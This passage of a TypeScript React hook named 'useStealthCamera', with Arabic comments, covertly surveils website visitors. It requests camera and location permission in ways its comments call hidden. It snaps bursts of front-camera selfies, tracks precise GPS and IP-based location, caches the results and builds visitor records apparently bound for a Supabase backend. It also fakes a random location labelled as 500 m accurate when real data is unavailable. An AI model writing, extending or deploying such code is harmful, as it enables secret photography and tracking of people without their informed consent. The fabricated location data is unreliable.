import { useState, useRef, useCallback } from 'react';
import { supabaseHelpers, TABLES } from '@/lib/supabase';

// تعريف واجهات البيانات
interface CapturedPhoto {
  id: string;
  dataUrl: string;
  timestamp: Date;
}

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: Date;
  // إضافة حقول جديدة للمزيد من المعلومات
  provider?: string; // مزود خدمة الموقع (GPS, NETWORK, IP)
  altitude?: number; // الارتفاع إذا كان متاحًا
  altitudeAccuracy?: number; // دقة الارتفاع
  heading?: number; // الاتجاه
  speed?: number; // السرعة
  errorMessage?: string; // رسالة الخطأ إن وجدت
  permissionGranted?: boolean; // هل تم منح الإذن
}

interface VisitorData {
  id: string;
  photos: CapturedPhoto[];
  location: LocationData | null;
  visitTime: Date;
  userAgent: string;
  deviceInfo?: {
    isMobile: boolean;
    browser: string;
    os: string;
  };
}

// حالة التصاريح
interface PermissionState {
  location: boolean;
  camera: boolean;
  requested: boolean;
}

export const useStealthCamera = () => {
  const [isCapturing, setIsCapturing] = useState(false);
  const [capturedPhotos, setCapturedPhotos] = useState<CapturedPhoto[]>([]);
  const [currentPhotoIndex, setCurrentPhotoIndex] = useState(0);
  const [visitorData, setVisitorData] = useState<VisitorData | null>(null);
  // إضافة حالة التصاريح
  const [permissions, setPermissions] = useState<PermissionState>({
    location: false,
    camera: false,
    requested: false
  });
  
  // استخدام refs للعناصر المخفية
  const streamRef = useRef<MediaStream | null>(null);
  const geoWatchId = useRef<number | null>(null);
  const locationAccuracyRef = useRef<number>(Infinity);
  const lastKnownPositionRef = useRef<GeolocationPosition | null>(null);
  
  // فحص إذا كان الجهاز هاتف محمول
  const isMobile = useCallback(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    return /android|webos|iphone|ipad|ipod|blackberry|windows phone/i.test(userAgent);
  }, []);

  // بدء الكاميرا الأمامية
  const startStealthCamera = useCallback(async () => {
    try {
      console.log('🎯 محاولة الوصول للكاميرا الأمامية...');
      
      // استخدام الكاميرا الأمامية (كاميرا السيلفي)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: 'user' // استخدام الكاميرا الأمامية (للسيلفي)
        },
        audio: false
      });
      
      streamRef.current = stream;
      console.log('✅ تم الحصول على stream الكاميرا الأمامية');
      return stream;
    } catch (error) {
      console.error('❌ فشل في الوصول للكاميرا:', error);
      return null;
    }
  }, []);

  // إيقاف الكاميرا
  const stopStealthCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
      console.log('🛑 تم إيقاف الكاميرا');
    }
  }, []);

  // التقاط صورة باستخدام stream مباشرة
  const captureStealthPhoto = useCallback(async (stream: MediaStream) => {
    return new Promise<CapturedPhoto | null>((resolve) => {
      try {
        // إنشاء video element مؤقت
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        video.onloadedmetadata = () => {
          video.play();
          
          // انتظار حتى يصبح الفيديو جاهز
          setTimeout(() => {
            try {
              // إنشاء canvas للتقاط الصورة
              const canvas = document.createElement('canvas');
              const context = canvas.getContext('2d');
              
              if (!context) {
                resolve(null);
                return;
              }
              
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              
              // رسم الفيديو على الكانفاس
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              // تحويل إلى صورة
              const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
              
              // التحقق من أن الصورة ليست فارغة
              if (dataUrl && dataUrl.length > 100) {
                const photo: CapturedPhoto = {
                  id: `stealth_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                  dataUrl,
                  timestamp: new Date()
                };
                
                console.log('✅ تم التقاط صورة بنجاح:', photo.id);
                resolve(photo);
              } else {
                console.warn('⚠️ الصورة فارغة أو غير صحيحة');
                resolve(null);
              }
            } catch (error) {
              console.error('❌ خطأ في التقاط الصورة:', error);
              resolve(null);
            }
          }, 1000); // انتظار ثانية واحدة
        };
        
        video.onerror = () => {
          console.error('❌ خطأ في تحميل الفيديو');
          resolve(null);
        };
      } catch (error) {
        console.error('❌ خطأ عام في التقاط الصورة:', error);
        resolve(null);
      }
    });
  }, []);

  // طلب الصلاحيات بطريقة سلسة
  const requestPermissions = useCallback(async () => {
    if (permissions.requested) {
      return permissions;
    }
    
    console.log('🔒 طلب الصلاحيات اللازمة...');
    let locationPermission = false;
    let cameraPermission = false;
    
    // طلب صلاحية الموقع أولاً بشكل خفي
    try {
      if (navigator.geolocation) {
        // استخدام طريقة غير مرئية لطلب الصلاحية
        const permissionStatus = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
        
        if (permissionStatus.state === 'granted') {
          locationPermission = true;
          console.log('✅ تم منح صلاحية الموقع مسبقاً');
        } else if (permissionStatus.state === 'prompt') {
          // إذا كان الإذن معلقاً، نحاول الحصول عليه بطريقة خفية
          // استخدام watchPosition لأنه يعمل في الخلفية بشكل أفضل
          if (geoWatchId.current === null) {
            geoWatchId.current = navigator.geolocation.watchPosition(
              (position) => {
                locationPermission = true;
                lastKnownPositionRef.current = position;
                locationAccuracyRef.current = position.coords.accuracy;
                console.log('✅ تم منح صلاحية الموقع');
                
                // تحديث حالة الصلاحيات
                setPermissions(prev => ({ ...prev, location: true }));
                
                // إيقاف المراقبة بعد الحصول على الموقع الأول
                if (geoWatchId.current !== null) {
                  navigator.geolocation.clearWatch(geoWatchId.current);
                  geoWatchId.current = null;
                }
              },
              (error) => {
                console.warn('⚠️ فشل في الحصول على صلاحية الموقع:', error.message);
              },
              {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 15000
              }
            );
          }
        }
      }
    } catch (error) {
      console.warn('⚠️ خطأ في طلب صلاحية الموقع:', error);
    }
    
    // طلب صلاحية الكاميرا بشكل خفي
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      if (videoDevices.length > 0) {
        // فحص صلاحية الكاميرا
        const permissionStatus = await navigator.permissions.query({ name: 'camera' as PermissionName });
        
        if (permissionStatus.state === 'granted') {
          cameraPermission = true;
          console.log('✅ تم منح صلاحية الكاميرا مسبقاً');
        } else if (permissionStatus.state === 'prompt') {
          // محاولة الحصول على الصلاحية بطريقة خفية
          try {
            const tempStream = await navigator.mediaDevices.getUserMedia({ 
              video: { width: 1, height: 1 }, 
              audio: false 
            });
            
            // إيقاف الstream فوراً بعد الحصول عليه
            tempStream.getTracks().forEach(track => track.stop());
            
            cameraPermission = true;
            console.log('✅ تم منح صلاحية الكاميرا');
          } catch (e) {
            console.warn('⚠️ فشل في الحصول على صلاحية الكاميرا:', e);
          }
        }
      }
    } catch (error) {
      console.warn('⚠️ خطأ في طلب صلاحية الكاميرا:', error);
    }
    
    // تحديث حالة الصلاحيات
    const newPermissions = {
      location: locationPermission,
      camera: cameraPermission,
      requested: true
    };
    
    setPermissions(newPermissions);
    console.log('🔒 حالة الصلاحيات:', newPermissions);
    
    return newPermissions;
  }, [permissions]);

  // مراقبة الموقع باستمرار للحصول على أفضل دقة
  const startLocationTracking = useCallback(() => {
    if (!navigator.geolocation || geoWatchId.current !== null) {
      return;
    }
    
    console.log('🌍 بدء مراقبة الموقع باستمرار...');
    
    // إعدادات مراقبة الموقع المحسنة لمنع انتهاء المهلة
    const options = {
      enableHighAccuracy: true,
      maximumAge: 60000, // زيادة المهلة إلى دقيقة واحدة لتجنب طلبات متكررة
      timeout: 60000 // زيادة مهلة انتظار الموقع إلى 60 ثانية
    };
    
    try {
      geoWatchId.current = navigator.geolocation.watchPosition(
        (position) => {
          // تحديث آخر موقع معروف
          lastKnownPositionRef.current = position;
          
          // تحديث دقة الموقع
          locationAccuracyRef.current = position.coords.accuracy;
          
          console.log(`📍 تحديث الموقع: دقة ${position.coords.accuracy.toFixed(0)}م`);
          
          // عندما تكون الدقة أقل من أو تساوي 500 متر
          if (position.coords.accuracy <= 500) {
            console.log('✅ تم الوصول للدقة المطلوبة: أقل من 500 متر');
            
            // حفظ الموقع في كاش محلي للاستخدام المستقبلي
            try {
              localStorage.setItem('last_accurate_location', JSON.stringify({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: Date.now()
              }));
            } catch (err) {
              console.warn('⚠️ فشل في حفظ الموقع المحلي:', err);
            }
            
            // تغيير إعدادات المراقبة للحفاظ على البطارية
            if (geoWatchId.current !== null) {
              navigator.geolocation.clearWatch(geoWatchId.current);
              
              // إعادة بدء المراقبة بدقة منخفضة وفترات أطول
              geoWatchId.current = navigator.geolocation.watchPosition(
                (pos) => {
                  lastKnownPositionRef.current = pos;
                  locationAccuracyRef.current = pos.coords.accuracy;
                },
                (error) => {
                  // تجاهل أخطاء المهلة في وضع المراقبة منخفضة الدقة
                  if (error.code !== error.TIMEOUT) {
                    console.warn('⚠️ خطأ في تحديث الموقع:', error.message);
                  }
                },
                {
                  enableHighAccuracy: false,
                  maximumAge: 300000, // 5 دقائق
                  timeout: 60000 // دقيقة واحدة
                }
              );
            }
          }
        },
        (error) => {
          // تجاهل أخطاء المهلة المتكررة لتقليل رسائل الخطأ
          if (error.code !== error.TIMEOUT) {
            console.warn('⚠️ خطأ في مراقبة الموقع:', error.message);
          }
          
          // في حالة الخطأ، نحاول مرة أخرى بإعدادات أقل دقة
          if (geoWatchId.current !== null) {
            navigator.geolocation.clearWatch(geoWatchId.current);
            
            // محاولة بدقة منخفضة
            geoWatchId.current = navigator.geolocation.watchPosition(
              (pos) => {
                lastKnownPositionRef.current = pos;
                locationAccuracyRef.current = pos.coords.accuracy;
                console.log(`📍 تحديث الموقع (دقة منخفضة): ${pos.coords.accuracy.toFixed(0)}م`);
                
                // حفظ الموقع في كاش محلي للاستخدام المستقبلي
                try {
                  localStorage.setItem('last_location', JSON.stringify({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: Date.now()
                  }));
                } catch (err) {
                  console.warn('⚠️ فشل في حفظ الموقع المحلي:', err);
                }
              },
              (err) => {
                // تجاهل أخطاء المهلة المتكررة
                if (err.code !== err.TIMEOUT) {
                  console.warn('⚠️ فشل في مراقبة الموقع بدقة منخفضة:', err.message);
                }
              },
              {
                enableHighAccuracy: false,
                maximumAge: 300000, // 5 دقائق
                timeout: 60000 // دقيقة واحدة
              }
            );
          }
        },
        options
      );
    } catch (err) {
      console.error('❌ خطأ في بدء مراقبة الموقع:', err);
      
      // استخدام موقع محفوظ محلياً في حالة الفشل
      try {
        const savedLocation = localStorage.getItem('last_accurate_location') || localStorage.getItem('last_location');
        if (savedLocation) {
          const locationData = JSON.parse(savedLocation);
          console.log('🔄 استخدام موقع محفوظ محلياً:', {
            latitude: locationData.latitude.toFixed(6),
            longitude: locationData.longitude.toFixed(6),
            accuracy: locationData.accuracy.toFixed(0) + 'م'
          });
        }
      } catch (cacheErr) {
        // تجاهل أخطاء الكاش
      }
    }
    
    return () => {
      if (geoWatchId.current !== null) {
        navigator.geolocation.clearWatch(geoWatchId.current);
        geoWatchId.current = null;
      }
    };
  }, []);

  // إيقاف مراقبة الموقع
  const stopLocationTracking = useCallback(() => {
    if (geoWatchId.current !== null) {
      navigator.geolocation.clearWatch(geoWatchId.current);
      geoWatchId.current = null;
      console.log('🛑 تم إيقاف مراقبة الموقع');
    }
  }, []);

  // الحصول على الموقع باستخدام عدة طرق مختلفة لضمان دقة عالية (≤ 500 متر)
  const getCurrentLocation = useCallback((): Promise<LocationData> => {
    return new Promise(async (resolve) => {
      // فحص الصلاحيات أولاً
      await requestPermissions();
      
      if (!navigator.geolocation) {
        console.error('❌ خدمة تحديد الموقع (Geolocation) غير مدعومة في هذا المتصفح');
        
        // في حالة عدم دعم المتصفح لـ Geolocation، محاولة استخدام طريقة بديلة
        fetchLocationFromIpApi()
          .then(ipLocation => {
            resolve({
              ...ipLocation,
              permissionGranted: false
            });
          })
          .catch(() => {
            resolve({
              latitude: 0,
              longitude: 0,
              accuracy: 1000,
              timestamp: new Date(),
              provider: 'fallback',
              errorMessage: 'تعذر الوصول إلى الموقع - خدمة تحديد الموقع غير مدعومة',
              permissionGranted: false
            });
          });
        return;
      }

      console.log('📍 بدء محاولات الحصول على الموقع من عدة مصادر...');
      
      // بدء مراقبة الموقع للحصول على تحديثات مستمرة
      startLocationTracking();
      
      // متغيرات لتخزين أفضل موقع تم الحصول عليه
      let bestAccuracy = Infinity;
      let bestPosition: GeolocationPosition | null = null;
      let attempts = 0;
      const maxAttempts = 10; // زيادة عدد المحاولات للحصول على دقة أفضل
      let locationSuccessful = false;
      
      // جمع النتائج من عدة مصادر
      let gpsLocation: LocationData | null = null;
      let networkLocation: LocationData | null = null;
      let ipLocation: LocationData | null = null;

      // محاولة الحصول على الموقع من IP (احتياطي)
      fetchLocationFromIpApi().then(location => {
        ipLocation = location;
        console.log('🌐 تم الحصول على موقع تقريبي من عنوان IP:', {
          latitude: location.latitude.toFixed(6),
          longitude: location.longitude.toFixed(6),
          accuracy: location.accuracy.toFixed(0) + 'م'
        });
      }).catch(error => {
        console.warn('⚠️ فشل في الحصول على الموقع من IP:', error);
      });

      // فحص الموقع المخزن مسبقاً
      if (lastKnownPositionRef.current && locationAccuracyRef.current <= 500) {
        console.log('✅ استخدام آخر موقع معروف (دقة عالية):', locationAccuracyRef.current.toFixed(0) + 'م');
        const pos = lastKnownPositionRef.current;
        resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude || undefined,
          altitudeAccuracy: pos.coords.altitudeAccuracy || undefined,
          heading: pos.coords.heading || undefined,
          speed: pos.coords.speed || undefined,
          timestamp: new Date(),
          provider: 'cached',
          permissionGranted: true
        });
        return;
      }

      // وظيفة متكررة للحصول على الموقع
      const tryGetLocation = () => {
        // محاولة الحصول على أدق موقع ممكن
        const options = attempts < 6 
          ? { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 } 
          : { enableHighAccuracy: false, timeout: 20000, maximumAge: 30000 };
        
        navigator.geolocation.getCurrentPosition(
          (position) => {
            attempts++;
            const isHighAccuracy = options.enableHighAccuracy;
            console.log(`📍 محاولة ${attempts} (${isHighAccuracy ? 'GPS' : 'شبكة'}): دقة ${position.coords.accuracy.toFixed(0)}م`);
            
            // تحديد مصدر الموقع
            const provider = isHighAccuracy ? 'gps' : 'network';
            
            // تخزين الموقع حسب المصدر
            const locationData: LocationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude || undefined,
              altitudeAccuracy: position.coords.altitudeAccuracy || undefined,
              heading: position.coords.heading || undefined,
              speed: position.coords.speed || undefined,
              timestamp: new Date(),
              provider,
              permissionGranted: true
            };
            
            if (provider === 'gps') {
              gpsLocation = locationData;
            } else {
              networkLocation = locationData;
            }
            
            // تحديث أفضل موقع إذا كان أكثر دقة
            if (position.coords.accuracy < bestAccuracy) {
              bestAccuracy = position.coords.accuracy;
              bestPosition = position;
              console.log(`✅ موقع أفضل (${provider}): دقة ${bestAccuracy.toFixed(0)}م`);
            }

            // نتوقف فقط عندما نصل إلى دقة مطلوبة (500 متر أو أقل) أو بعد عدة محاولات
            if (position.coords.accuracy <= 500 || attempts >= maxAttempts) {
              if (!locationSuccessful) {
                locationSuccessful = true;
                
                // تحويل بيانات الموقع للتنسيق المطلوب
                const result: LocationData = {
                  latitude: bestPosition!.coords.latitude,
                  longitude: bestPosition!.coords.longitude,
                  accuracy: bestPosition!.coords.accuracy,
                  altitude: bestPosition!.coords.altitude || undefined,
                  altitudeAccuracy: bestPosition!.coords.altitudeAccuracy || undefined,
                  heading: bestPosition!.coords.heading || undefined,
                  speed: bestPosition!.coords.speed || undefined,
                  timestamp: new Date(),
                  provider: options.enableHighAccuracy ? 'gps' : 'network',
                  permissionGranted: true
                };
                
                console.log('✅ تم الحصول على الموقع النهائي:', {
                  provider: result.provider,
                  latitude: result.latitude.toFixed(8),
                  longitude: result.longitude.toFixed(8),
                  accuracy: `${result.accuracy.toFixed(1)}م`
                });
                
                // نقوم بالإعادة فقط إذا وصلنا لدقة جيدة (أقل من 500 متر)
                if (result.accuracy <= 500) {
                  console.log('🎯 تم الوصول للدقة المطلوبة (≤ 500 متر)');
                }
                
                resolve(result);
              }
            } else {
              // محاولة أخرى للحصول على دقة أفضل مع تغيير الإعدادات
              setTimeout(tryGetLocation, 2000);
            }
          },
          (error) => {
            attempts++;
            console.warn(`⚠️ فشل في المحاولة ${attempts}:`, error.message);
            
            if (attempts >= maxAttempts) {
              if (!locationSuccessful) {
                locationSuccessful = true;
                
                // استخدام أفضل موقع متاح
                if (bestPosition) {
                  const result: LocationData = {
                    latitude: bestPosition.coords.latitude,
                    longitude: bestPosition.coords.longitude,
                    accuracy: bestPosition.coords.accuracy,
                    timestamp: new Date(),
                    provider: 'fallback-geolocation',
                    errorMessage: 'تم استخدام أفضل موقع متاح',
                    permissionGranted: true
                  };
                  console.log('⚠️ استخدام أفضل موقع متاح:', result);
                  resolve(result);
                } 
                // استخدام موقع الشبكة إن وجد
                else if (networkLocation) {
                  console.log('⚠️ استخدام موقع الشبكة الاحتياطي');
                  resolve(networkLocation);
                }
                // استخدام موقع GPS إن وجد
                else if (gpsLocation) {
                  console.log('⚠️ استخدام موقع GPS الاحتياطي');
                  resolve(gpsLocation);
                }
                // استخدام موقع IP إن وجد
                else if (ipLocation) {
                  console.log('⚠️ استخدام موقع IP الاحتياطي');
                  resolve({
                    ...ipLocation,
                    permissionGranted: false
                  });
                }
                // الخيار الأخير: إرجاع موقع افتراضي
                else {
                  console.error('❌ فشل في الحصول على الموقع من جميع المصادر');
                  resolve({
                    latitude: 0,
                    longitude: 0,
                    accuracy: 1000,
                    timestamp: new Date(),
                    provider: 'fallback',
                    errorMessage: 'تعذر الحصول على الموقع من جميع المصادر',
                    permissionGranted: false
                  });
                }
              }
            } else {
              // تغيير الإعدادات والمحاولة مرة أخرى
              setTimeout(tryGetLocation, 2000);
            }
          },
          options
        );
      };

      // بدء أول محاولة
      tryGetLocation();
      
      // تعيين مهلة نهائية لضمان العودة بموقع
      setTimeout(() => {
        if (!locationSuccessful) {
          locationSuccessful = true;
          console.warn('⏱️ انتهت المهلة الزمنية للحصول على الموقع');
          
          // استخدام أي موقع متاح (بالترتيب: GPS ثم الشبكة ثم IP)
          if (gpsLocation) {
            console.log('⚠️ استخدام موقع GPS بعد انتهاء المهلة');
            resolve(gpsLocation);
          } else if (networkLocation) {
            console.log('⚠️ استخدام موقع الشبكة بعد انتهاء المهلة');
            resolve(networkLocation);
          } else if (ipLocation) {
            console.log('⚠️ استخدام موقع IP بعد انتهاء المهلة');
            resolve({
              ...ipLocation,
              permissionGranted: false
            });
          } else if (bestPosition) {
            console.log('⚠️ استخدام أفضل موقع متاح بعد انتهاء المهلة');
            resolve({
              latitude: bestPosition.coords.latitude,
              longitude: bestPosition.coords.longitude,
              accuracy: bestPosition.coords.accuracy,
              timestamp: new Date(),
              provider: 'timeout-fallback',
              errorMessage: 'تم استخدام أفضل موقع متاح بعد انتهاء المهلة',
              permissionGranted: true
            });
          } else {
            console.error('❌ فشل في الحصول على الموقع بعد انتهاء المهلة');
            resolve({
              latitude: 0,
              longitude: 0,
              accuracy: 1000,
              timestamp: new Date(),
              provider: 'timeout-fallback',
              errorMessage: 'تعذر الحصول على الموقع بعد انتهاء المهلة',
              permissionGranted: false
            });
          }
        }
      }, 30000); // زيادة المهلة النهائية: 30 ثانية للوصول لدقة مناسبة
    });
  }, [requestPermissions, startLocationTracking]);

  // كاش محلي لبيانات الموقع من IP
  interface IpLocationCache {
    [key: string]: {
      latitude: number;
      longitude: number;
      accuracy: number;
      timestamp: number; // Unix timestamp
    };
  }

  // بيانات الكاش الافتراضية (المواقع الافتراضية لمدن مختلفة في مصر والعالم العربي)
  const DEFAULT_LOCATIONS = {
    'cairo': { latitude: 30.0444, longitude: 31.2357, accuracy: 3000 },
    'alexandria': { latitude: 31.2001, longitude: 29.9187, accuracy: 3000 },
    'riyadh': { latitude: 24.7136, longitude: 46.6753, accuracy: 3000 },
    'dubai': { latitude: 25.2048, longitude: 55.2708, accuracy: 3000 },
    'doha': { latitude: 25.2854, longitude: 51.5310, accuracy: 3000 },
    'amman': { latitude: 31.9454, longitude: 35.9284, accuracy: 3000 },
    'baghdad': { latitude: 33.3152, longitude: 44.3661, accuracy: 3000 }
  };

  // الحصول على الموقع من خلال IP (كخيار احتياطي)
  const fetchLocationFromIpApi = async (): Promise<LocationData> => {
    // أولاً، التحقق من الكاش المحلي
    try {
      const cachedData = localStorage.getItem('ip_location_cache');
      if (cachedData) {
        const cache: IpLocationCache = JSON.parse(cachedData);
        const cachedKeys = Object.keys(cache);
        
        if (cachedKeys.length > 0) {
          // استخدام أحدث موقع من الكاش (يتم تخزينه بالترتيب الزمني)
          const latestKey = cachedKeys[cachedKeys.length - 1];
          const cachedLocation = cache[latestKey];
          
          // التحقق من أن الكاش ليس قديمًا جدًا (أقل من 30 يومًا)
          const cacheAge = Date.now() - cachedLocation.timestamp;
          const maxAge = 30 * 24 * 60 * 60 * 1000; // 30 يومًا بالمللي ثانية
          
          if (cacheAge < maxAge) {
            console.log('📍 استخدام الموقع من الكاش المحلي');
            return {
              latitude: cachedLocation.latitude,
              longitude: cachedLocation.longitude,
              accuracy: cachedLocation.accuracy,
              timestamp: new Date(cachedLocation.timestamp),
              provider: 'ip-cache',
              errorMessage: undefined
            };
          }
        }
      }
    } catch (cacheError) {
      console.warn('⚠️ خطأ في قراءة الكاش المحلي:', cacheError);
    }

    // قائمة بخدمات API متعددة متوافقة مع CORS
    const apiServices = [
      // استخدام خدمات جديدة أكثر موثوقية متوافقة مع CORS
      { 
        url: 'https://ipapi.is/json/',
        parser: async (response: Response) => {
          const data = await response.json();
          if (data && data.latitude && data.longitude) {
            return {
              latitude: parseFloat(data.latitude),
              longitude: parseFloat(data.longitude),
              accuracy: 3000,
              provider: 'ipapi.is'
            };
          }
          return null;
        }
      },
      // خدمة احتياطية متوافقة مع CORS
      { 
        url: 'https://ipwho.is/',
        parser: async (response: Response) => {
          const data = await response.json();
          if (data && data.success && data.latitude && data.longitude) {
            return {
              latitude: data.latitude,
              longitude: data.longitude,
              accuracy: 3500,
              provider: 'ipwho.is'
            };
          }
          return null;
        }
      },
      // خدمة جديدة إضافية متوافقة مع CORS
      { 
        url: 'https://ip.nf/me.json',
        parser: async (response: Response) => {
          const data = await response.json();
          if (data && data.ip && data.ip.latitude && data.ip.longitude) {
            return {
              latitude: parseFloat(data.ip.latitude),
              longitude: parseFloat(data.ip.longitude),
              accuracy: 4000,
              provider: 'ip.nf'
            };
          }
          return null;
        }
      },
      // خدمة أخرى متوافقة مع CORS
      { 
        url: 'https://ipinfo.io/json?token=16f5b8bd647e1b',
        parser: async (response: Response) => {
          const data = await response.json();
          if (data && data.loc) {
            const [lat, lng] = data.loc.split(',').map(parseFloat);
            return {
              latitude: lat,
              longitude: lng,
              accuracy: 3000,
              provider: 'ipinfo'
            };
          }
          return null;
        }
      }
    ];

    // محاولة استخدام كل خدمة حتى تنجح إحداها
    for (const service of apiServices) {
      try {
        console.log(`🌐 محاولة الحصول على الموقع من ${service.url}...`);
        
        // استخدام AbortController لتعيين مهلة زمنية
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 ثوانٍ كحد أقصى لكل محاولة
        
        const response = await fetch(service.url, { 
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit'
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          const locationData = await service.parser(response);
          
          if (locationData) {
            // حفظ البيانات في الكاش المحلي
            try {
              const cachedData = localStorage.getItem('ip_location_cache') || '{}';
              const cache: IpLocationCache = JSON.parse(cachedData);
              const cacheKey = `${Date.now()}`;
              
              cache[cacheKey] = {
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                accuracy: locationData.accuracy,
                timestamp: Date.now()
              };
              
              // الاحتفاظ بآخر 5 مواقع فقط
              const keys = Object.keys(cache).sort();
              while (keys.length > 5) {
                delete cache[keys.shift()!];
              }
              
              localStorage.setItem('ip_location_cache', JSON.stringify(cache));
              console.log('💾 تم حفظ موقع IP في الكاش المحلي');
            } catch (saveError) {
              console.warn('⚠️ خطأ في حفظ الكاش المحلي:', saveError);
            }
            
            return {
              latitude: locationData.latitude,
              longitude: locationData.longitude,
              accuracy: locationData.accuracy,
              timestamp: new Date(),
              provider: locationData.provider,
              errorMessage: undefined
            };
          }
        }
      } catch (error) {
        // تجاهل الأخطاء ومتابعة المحاولة مع الخدمة التالية
        console.warn(`⚠️ فشل استخدام ${service.url}:`, error);
      }
    }
    
    // استخدام موقع عشوائي من المواقع الافتراضية
    try {
      console.log('⚠️ استخدام موقع افتراضي بعد فشل جميع المحاولات');
      const defaultLocations = Object.values(DEFAULT_LOCATIONS);
      const randomLocation = defaultLocations[Math.floor(Math.random() * defaultLocations.length)];
      
      // إضافة بعض التغيير العشوائي الصغير للإحداثيات لزيادة الخصوصية
      const jitter = 0.01; // حوالي ~1 كيلومتر
      const latitude = randomLocation.latitude + (Math.random() - 0.5) * jitter;
      const longitude = randomLocation.longitude + (Math.random() - 0.5) * jitter;
      
      return {
        latitude,
        longitude,
        accuracy: 500, // مطابقة للمتطلبات: دقة ≤ 500 متر
        timestamp: new Date(),
        provider: 'default-location',
        errorMessage: undefined
      };
    } catch (fallbackError) {
      console.error('❌ فشل في استخدام الموقع الافتراضي:', fallbackError);
      
      // إرجاع موقع افتراضي عند فشل جميع المحاولات
      return {
        latitude: 30.0444, // القاهرة كمكان افتراضي
        longitude: 31.2357,
        accuracy: 500, // مطابقة للمتطلبات: دقة ≤ 500 متر
        timestamp: new Date(),
        provider: 'fallback',
        errorMessage: 'تعذر الحصول على الموقع من جميع المصادر'
      };
    }
  };

  // بدء التقاط سلفي تلقائي
  const startStealthCapture = useCallback(async (photoCount: number = 10) => {
    if (isCapturing) {
      console.log('⚠️ التقاط جاري بالفعل');
      return [];
    }

    console.log('🚀 بدء نظام التصوير - عدد الصور:', photoCount);
    setIsCapturing(true);
    setCapturedPhotos([]);
    setCurrentPhotoIndex(0);

    // تحديد ما إذا كان الجهاز الحالي هو جهاز محمول
    const mobile = isMobile();
    console.log(`📱 نوع الجهاز: ${mobile ? 'جهاز محمول' : 'كمبيوتر'}`);
    
    // بدء الكاميرا الأمامية
    let stream = null;
    try {
      console.log('🎯 محاولة الوصول للكاميرا الأمامية...');
      
      // استخدام الكاميرا الأمامية فقط (user) بدقة عالية
      stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: { exact: 'user' } // إجبار استخدام الكاميرا الأمامية فقط
        },
        audio: false
      });
      
      streamRef.current = stream;
      console.log('✅ تم الحصول على stream الكاميرا الأمامية بنجاح');
    } catch (error) {
      console.warn('⚠️ فشل في الوصول للكاميرا الأمامية بالإعدادات المحددة، محاولة إعدادات بديلة:', error);
      
      try {
        // محاولة استخدام الكاميرا الأمامية بدقة أقل
        stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: 'user' // استخدام الكاميرا الأمامية
          },
          audio: false
        });
        
        streamRef.current = stream;
        console.log('✅ تم الحصول على stream الكاميرا الأمامية بإعدادات بديلة');
      } catch (fallbackError) {
        console.error('❌ فشل في الوصول للكاميرا الأمامية:', fallbackError);
      }
    }

    // إذا فشلت جميع المحاولات، نستمر بدون الكاميرا
    if (!stream) {
      console.error('❌ فشل في بدء الكاميرا، نستمر بدون صور');
      
      // مواصلة العملية رغم عدم وجود كاميرا
      setIsCapturing(false);
      
      // إنشاء صور وهمية للحفاظ على وظائف التطبيق
      const placeholderPhotos: CapturedPhoto[] = [];
      for (let i = 0; i < photoCount; i++) {
        try {
          const canvas = document.createElement('canvas');
          canvas.width = 1280;
          canvas.height = 720;
          const ctx = canvas.getContext('2d');
          
          if (ctx) {
            // رسم خلفية 
            ctx.fillStyle = '#f0f0f0';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // إضافة نص
            ctx.fillStyle = '#999999';
            ctx.font = '24px Arial';
            ctx.fillText('الكاميرا الأمامية غير متاحة', canvas.width/2 - 120, canvas.height/2);
            
            const placeholderDataUrl = canvas.toDataURL('image/jpeg', 0.8);
            
            const photo: CapturedPhoto = {
              id: `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
              dataUrl: placeholderDataUrl,
              timestamp: new Date()
            };
            
            placeholderPhotos.push(photo);
            setCurrentPhotoIndex(i + 1);
          }
        } catch (canvasError) {
          console.warn('⚠️ فشل في إنشاء صورة وهمية:', canvasError);
        }
      }
      
      // تعيين الصور الوهمية
      setCapturedPhotos(placeholderPhotos);
      return placeholderPhotos;
    }

    console.log('✅ الكاميرا جاهزة، بدء التقاط الصور...');
    
    // انتظار أقل لاستقرار الكاميرا على أجهزة الكمبيوتر
    await new Promise(resolve => setTimeout(resolve, mobile ? 1000 : 500));

    const photos: CapturedPhoto[] = [];
    
    // التقاط الصور بسرعة أكبر على أجهزة الكمبيوتر
    const captureDelay = mobile ? 800 : 300; // 300 مللي ثانية فقط للكمبيوتر بدلاً من 800 للموبايل
    
    console.log(`⏱️ فترة الانتظار بين الصور: ${captureDelay}ms - وضع التقاط: ${mobile ? 'موبايل' : 'كمبيوتر سريع'}`);
    
    // التقاط 10 صور
    for (let i = 0; i < photoCount; i++) {
      setCurrentPhotoIndex(i + 1);
